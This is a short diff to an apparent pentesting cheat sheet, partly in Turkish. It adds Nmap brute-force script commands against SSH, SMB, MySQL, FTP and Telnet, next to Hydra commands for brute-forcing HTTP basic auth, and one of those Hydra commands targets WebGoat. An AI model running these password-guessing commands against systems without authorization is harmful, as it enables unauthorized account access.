@@ -17,3 +17,9 @@ WEB(Basic-auth):
 hydra <target ip> <http metod> "<url uzantısı>" -L <userwordlist> -P " <password list>"
 hydra 192.168.1.10 http-get "WebGoat/attack"  -L user.txt  -P pass.txt
 
+
+Nmap <ipadreesi> --script ssh-brute --script-args userdb="<wordlistpath>",passdb="<wordlist>"
+Nmap <ipadreesi> --script smb-brute --script-args userdb="<wordlistpath>",passdb="<wordlist>"
+Nmap <ipadreesi> --script mysql-brute --script-args userdb="<wordlistpath>",passdb="<wordlist>"
+Nmap <ipadreesi> --script ftp-brute --script-args userdb="<wordlistpath>",passdb="<wordlist>"
+Nmap <ipadreesi> --script telnet-brute --script-args userdb="<wordlistpath>",passdb="<wordlist>"
